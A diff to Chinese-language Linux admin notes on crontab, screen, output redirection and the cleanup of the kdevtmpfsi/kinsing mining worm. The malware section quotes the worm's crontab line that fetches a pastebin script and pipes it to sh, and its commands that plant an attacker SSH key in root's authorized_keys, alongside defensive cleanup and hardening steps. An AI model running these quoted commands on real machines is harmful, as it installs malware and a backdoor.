@@ -47,13 +47,25 @@ $ ps -aux --sort=-pcpu|head -10
 
 ```
 
-## 查看定时任务
+## 查看定时任务 crontab命令
 
 ```
-$ crontab -l
+# 查看定时任务
+$ crontab -l  
+# 编辑定时任务，删除或者注释定时任务
+$ crontab -e
+# 编辑，针对的是root用户
 $ nano /etc/crontab
+# 停止crontab，启动crontab任务
+$ systemctl stop cron
+$ systemctl restart cron
 ```
 
+### `/etc/crontab`文件和`crontab -e`命令区别
+
+1. 格式不同。
+2. 修改/etc/crontab这种方法只有root用户能用，而crontab -e这种所有用户都可以使用，普通用户也只能为自己设置计划任务。然后自动写入`/var/spool/cron/usename`。
+3. 不管用 `crontab -e` or 改 `/etc/crontab` 都不需要重新启动 crond 服务
 
 ## 设置时区
 
@@ -391,9 +403,160 @@ $ screen -d yourname -> 远程detach某个session
 $ screen -d -r yourname -> 结束当前session并回到yourname这个session
 
 ```
+
 - 快捷键
-CTRL - a+d ->(常用退出切换到后台运行) detach，暂时离开当前session，将目前的 screen session (可能含有多个 windows) 丢到后台执行，并会回到还没进 screen 时的状态，此时在 screen session 里，每个 window 内运行的 process (无论是前台/后台)都在继续执行，即使 logout 也不影响。 
-CTRL- a+z -> 把当前session放到后台执行，用 shell 的 fg 命令则可回去。
+
+1. CTRL - a+d ->(**常用退出切换到后台运行**) detach命令，暂时离开当前session，将目前的 screen session (可能含有多个 windows) 丢到后台执行，并会回到还没进 screen 时的状态，此时在 screen session 里，每个 window 内运行的 process (无论是前台/后台)都在继续执行，即使 logout 也不影响。 
+
+2. ~~CTRL- a+z -> 把当前session放到后台执行，用 shell 的 fg 命令则可回去，基本没有用到~~。
+
+3. `screen -X -S 28835 quit`-> 删除对应的session，其中的`28835`是通过命令`screen -ls`查看到的对应session的id。
+
+## shell脚本中>/dev/null 2>&1
+
+参考文档： https://www.cnblogs.com/youjianjiangnan/p/11561805.html
+
+`>/dev/null` 这条命令的作用是将标准输出1重定向到/dev/null中。 /dev/null代表linux的空设备文件，所有往这个文件里面写入的内容都会丢失，俗称“黑洞”。那么执行了>/dev/null之后，标准输出就会不再存在，没有任何地方能够找到输出的内容。
+`2>&1` 这条命令用到了重定向绑定，采用&可以将两个输出绑定在一起。这条命令的作用是错误输出将和标准输出同用一个文件描述符，**说人话就是错误输出将会和标准输出输出到同一个地方**。
+
+linux在执行shell命令之前，就会确定好所有的输入输出位置，并且从左到右依次执行重定向的命令，所以>/dev/null 2>&1的作用就是让**标准输出重定向到/dev/null中（丢弃标准输出），然后错误输出由于重用了标准输出的描述符，所以错误输出也被定向到了/dev/null中，错误输出同样也被丢弃了。执行了这条命令之后，该条shell命令将不会输出任何信息到控制台，也不会有任何信息输出到文件中**。
+
+
+### nohup结合
+
+我们经常使用nohup command &命令形式来启动一些后台程序，比如一些java服务：
+
+```
+# nohup java -jar xxxx.jar &
+```
+为了不让一些执行信息输出到前台（控制台），我们还会加上刚才提到的>/dev/null 2>&1命令来丢弃所有的输出：
+
+```
+# nohup java -jar xxxx.jar >/dev/null 2>&1 &
+```
+
+总而言之，在工作中用到最多的就是`nohup command >/dev/null 2>&1 &`命令
+
+## 挖矿木马病毒清理
+
+
+
+问题： 无意在使用`top`命令的时候发现一个异常进程: `kdevtmpfsi`,使用`ps -aux | grep kdevtmpfsi`,发现对应的执行文件路径是: `/tmp/kdevtmpfsi`. 然后尝试`kill -9`杀死进程后，再`rm -rf /tmp/kdevtmpfsi`还是会死而复生。
+
+### 木马解析
+
+1. 木马解析： https://xz.aliyun.com/t/4386, https://my.oschina.net/u/4437985/blog/3168526 (推荐)
+
+一般在定时任务（`crontab -l`）中存在异常脚本:
+
+```
+[root@mdw ~]# crontab -l
+*/15 * * * * （curl -fsSL https://pastebin.com/raw/xmxHzu5P||wget -q -O- https://pastebin.com/raw/xmxHzu5P)|sh
+```
+1). 攻击者通过网络进入第一台被感染的机器(redis未认证漏洞、ssh密码泄露登录等)。
+2). 第一台感染的机器会读取known_hosts文件，遍历ssh登录，如果是做了免密登录认证，则将直接进行横向传播。
+3). 修改/etc/cron.d/root文件，增加定时任务
+4). kill掉同类挖矿进程
+5). kill掉高好资源的其他进程
+6). 下载执行主恶意程序kerberods
+7). 拉起khugepageds挖矿进程
+8). 为文件添加chattr锁定
+9). 修改IPTABLES
+10). 清除日志
+11). 关闭SELinux
+12). 还有个后门，创建/root/.ssh/authorized_keys，添加病毒作者自己的公钥，保证其可以使用SSH登录到服务器，具体代码如下
+
+```
+chmod 700 /root/.ssh/
+echo >> /root/.ssh/authorized_keys
+chmod 600 root/.ssh/authorized_keys
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9WKiJ7yQ6HcafmwzDMv1RKxPdJI/oeXUWDNW1MrWiQNvKeSeSSdZ6NaYVqfSJgXUSgiQbktTo8Fhv43R9FWDvVhSrwPoFBz9SAfgO06jc0M2kGVNS9J2sLJdUB9u1KxY5IOzqG4QTgZ6LP2UUWLG7TGMpkbK7z6G8HAZx7u3l5+Vc82dKtI0zb/ohYSBb7pK/2QFeVa22L+4IDrEXmlv3mOvyH5DwCh3HcHjtDPrAhFqGVyFZBsRZbQVlrPfsxXH2bOLc1PMrK1oG8dyk8gY8m4iZfr9ZDGxs4gAqdWtBQNIN8cvz4SI+Jv9fvayMH7f+Kl2yXiHN5oD9BVTkdIWX root@u17" >> /root/.ssh/authorized_keys
+
+
+```
+
+### 木马分析
+
+1. 继续查看对应的定时任务目录`nano /etc/crontab`,发现没有对应的病毒形式的定时任务。继续查看用户目录下的定时任务: `/var/spool/cron/`也没有发现非法的定时任务。
+```
+$ nano /var/spool/cron/crontabs/root
+
+$ nano /var/spool/cron/root
+
+$ nano /etc/cron.d/root
+
+```
+2. 这个线程重复启动的原因是**它还有一个守护线程在运行**，检测到这个线程挂掉的时候就去重新启动，从而导致我们周而复始的出现这个问题。PS： 通过 `ps -ef` 命令查出 `kdevtmpfsi` 进程号，直接 kill -9 进程号并删除 /tmp/kdevtmpfsi 执行文件。但没有过1分钟进程又运行了，这时就能想到，kdevtmpfsi 有守护程序或者有计划任务。通过 crontab -l 查看是否有可疑的计划任务。
+
+3. 找到线程和守护线程
+根据上面结果知道 kdevtmpfsi 进程号是 10393，使用 `systemctl status 10393` 发现 `kdevtmpfsi` 有守护进程
+kill 掉 kdevtmpfsi 守护进程 kill -9 30903 30904，再 killall -9 kdevtmpfsi 挖矿病毒，最后删除 kdevtmpfsi 执行程序 rm -f /tmp/kdevtmpfsi
+```
+$ pstree -a
+$ netstat -natp
+```
+这时候我们就可以找到kdevtmpfsi线程 和它的守护线程`kinsing`.直接kill线程和它的守护线程:
+
+```
+$ ps -aux | grep curl
+$ ps -aux|grep kinsing
+$ ps -aux|grep kdevtmpfsi
+
+
+$ kill -9 19128
+$ kill -9 3722
+$ rm -rf /tmp/kdevtmpfsi
+$ rm -rf /var/tmp/kinsing
+$ find / -name "kinsing*" | xargs rm -rf
+$ find / -name kdevtmpfsi | xargs rm -rf
+$ rm -f /root/.ssh/authorized_keys
+```
+
+4. 查找可疑定时任务
+```
+# 首先停止cron服务，避免因其不断执行而导致恶意文件反复下载执行。如果操作系统可以使用service命令
+systemctl stop cron
+crontab -l 查看定时任务
+crontab -r 表示删除用户的定时任务，当执行此命令后，所有用户下面的定时任务会被删除
+```
+![https://img-blog.csdnimg.cn/20191227100428997.png](https://img-blog.csdnimg.cn/20191227100428997.png)
+
+删除可以定时任务`crontab -e`,编辑删除定时任务即可。
+
+5. 安全加固
+
+5.1. SSH
+① 谨慎做免密登录
+② 不使用默认的22端口
+③ 禁止root登录
+
+5.2. Redis
+① 增加授权认证(requirepass参数)
+② 尽量使用docker版本(docker pull redis)
+③ 隐藏重要的命令
+
+5.3 使用busybox删除
+
+5.4 屏蔽`pastebin.com`、thrysi.com等广泛被挖矿蠕虫利用的网站，达到阻断入侵的目的
+
+5.6 `netstat -natp` 命令查看是否有异常陌生IP的TCP连接，查询到有来自国外的陌生IP，做了白名单处理
+
+5.7 启用ssh公钥登陆，禁用密码登陆。
+5.8 云主机：完善安全策略，入口流量，一般只开放 80 443 端口就行，出口流量默认可以不限制，如果有需要根据需求来限制。物理机：可以通过硬件防火墙或者机器上iptables 来开放出入口流量规则。
+5.9 本机不是直接需要对外提供服务，可以拒绝外网卡入口所有流量，通过 jumper 机器内网登陆业务机器。
+
+
+
+### 常见非法的木马病毒
+
+
+挖矿病毒 | 正常文件 |关联文件 | 原因
+---------|----------|----------|----------
+ kdevtmpfsi | kdevtmpfs | kinsing |最根本的原因是自己的redis 6379配置不当导致的。大家可以参考阿里云的Redis服务安全加固
+ Watchdogs  | Watchdog | 
+ trace | trace |
+
+
 
 
 
